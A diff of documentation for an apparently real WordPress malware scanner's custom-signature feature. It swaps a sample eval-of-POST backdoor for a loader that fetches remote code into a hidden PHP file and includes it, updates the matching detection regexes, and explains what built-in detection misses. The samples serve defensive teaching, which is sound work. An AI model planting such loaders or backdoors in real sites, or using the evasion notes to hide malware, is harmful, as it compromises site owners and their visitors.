@@ -36,7 +36,7 @@ This guide covers what a signature can see, how to write one that catches the th
 Say the scan found `wp-content/uploads/2026/04/cache.php`, and the file starts like this:
 
 ```php
-<?php /* acme_loader 2.1 */ $k = $_POST['k']; if ($k) { eval(base64_decode($k)); }
+<?php /* acme_loader 2.1 */ $c = @file_get_contents(get_option('acme_cdn')); @file_put_contents(__DIR__ . '/.cache.php', $c); @include __DIR__ . '/.cache.php';
 ```
 
 1. Go to **Elderward > Signatures** and fill in **Add a signature**:
@@ -47,7 +47,7 @@ Say the scan found `wp-content/uploads/2026/04/cache.php`, and the file starts l
    - **Conditions:**
      ```
      text: acme_loader
-     regex: /eval\s*\(\s*base64_decode\s*\(\s*\$/i
+     regex: /file_put_contents\s*\([^;]{0,100}\.php['"]\s*,/i
      ```
 2. Under **Try signatures**, put the file's path (`wp-content/uploads/2026/04/cache.php`) and click **Try**: `custom.acme-loader` must be listed.
 3. Try a clean file of the same kind, for example `wp-includes/functions.php`: `custom.acme-loader` must **not** be listed.
@@ -58,6 +58,8 @@ HIGH,SIGNATURE_MATCH,…/cache.php,custom.acme-loader: ACME loader backdoor (cus
 ```
 
 That is the whole loop: sample → conditions → try on the bad file and a good file → save → scan.
+
+Why this sample: Elderward's **built-in detection** already reports the generic backdoor shapes on its own, as `MALWARE_FOUND` (code or commands taken from the request, `eval` of `base64_decode` output, password-gated shells, known shell families, PHP behind an image header, and more; the Signatures tab lists them). This loader reads no request input and decodes nothing, so it slips past them. That is where a custom signature earns its place: code the built-ins miss, and a family you want named in the findings.
 
 ## 3. What a signature is made of
 
@@ -78,9 +80,9 @@ Up to 200 custom signatures per site. Changes apply from the **next** scan.
 ### Files (`file`)
 
 - **Which files:** files under the WordPress folder whose extension is one of `php`, `php3`–`php8`, `phtml`, `pht`, `phps`, `inc`, `js`, `css`, `htm`, `html`, `shtml`, `tpl`, `tmpl`, `asp`, `aspx`, `asa`, `cfm`, `cgi`, `pl`, `py`, `sh`, `conf`, `cron`, `local`, `mod`, `sct`, `ejl`, `cin`, `izo`. The Elderward plugin folder itself is never scanned (its own signature strings would match).
-- **Size:** files over **2 MB** are skipped.
-- **Content:** the whole file as raw bytes. Nothing is decoded first: a rule sees `eval(base64_decode(...))` as written, not what the base64 contains.
-- **One finding per file:** signatures are tried in order, built-in first, and the **first one that matches wins**. If a built-in signature already catches a file, your custom one does not report it again.
+- **Size:** files over **2 MB** are not read. Each one is reported as `FILE_TOO_LARGE` instead (`ERROR` for PHP, `INFO` otherwise), so you can see what was not checked.
+- **Content:** the whole file as raw bytes. Nothing is decoded first: a rule sees `eval(base64_decode(...))` as written, not what the base64 contains. (The built-in detection set gets a second look at files nothing matched, with comments removed, `'ev'.'al'`-style fragments joined and letter escapes decoded; custom signatures always see the raw bytes.)
+- **One finding per file:** signatures are tried in order, built-in first (the cleanup signatures, then the built-in detection set), and the **first one that matches wins**. If a built-in signature already catches a file, your custom one does not report it again. Built-in detection goes first on purpose: a custom rule, even a mistaken one, can never re-label a file the built-ins call HIGH.
 - **Finding:** `SIGNATURE_MATCH` with your severity, the file path, and `custom.<name>: <description> (custom signature, report only)`.
 - **Other extensions:** malware sometimes hides PHP in a file named `.ico` or `.png` and includes it from elsewhere. The admin scan does not read those; the command-line scanner does with `allfiles=1` (see [section 7](#7-testing)). The `include` line that loads them is usually in a scanned file, so a rule on that line works everywhere.
 
@@ -291,7 +293,7 @@ The format:
       "enabled": true,
       "match": [
         {"string": "acme_loader"},
-        {"regex": "/eval\\s*\\(\\s*base64_decode\\s*\\(\\s*\\$/i"}
+        {"regex": "/file_put_contents\\s*\\([^;]{0,100}\\.php['\"]\\s*,/i"}
       ]
     },
     {
@@ -344,6 +346,8 @@ Conditions:  text: wp_sess_k
              regex: /eval\s*\(\s*\$\w+\s*\(/i
 Description: Backdoor that runs PHP sent in the wp_sess_k cookie
 ```
+
+As written, this one-line sample is also caught by built-in detection (`MEDIUM,MALWARE_FOUND,…,php_tiny_dynamic_call`), which goes first. The custom signature is what names the copies the built-ins miss, such as the same code padded inside a larger file.
 
 ### A JavaScript injection appended to theme files
 
@@ -411,7 +415,7 @@ Description: Script in post content that redirects visitors coming from search e
 - The scan started before you saved: changes apply from the next scan.
 - The signature is disabled.
 - A built-in signature matched the same file first ([one finding per file](#files-file)): look for a `MALWARE_FOUND` finding on it.
-- The file's extension is not scanned, or it is over 2 MB ([section 4](#4-what-each-target-sees)).
+- The file's extension is not scanned, or it is over 2 MB and reported as `FILE_TOO_LARGE` ([section 4](#4-what-each-target-sees)).
 - The file was marked as a false positive and has not changed since: look under **False positives**.
 - For posts: the text is in the title or in post meta, which are not scanned.
 - For options: it is `siteurl`, `home`, `active_plugins` or the user roles option.
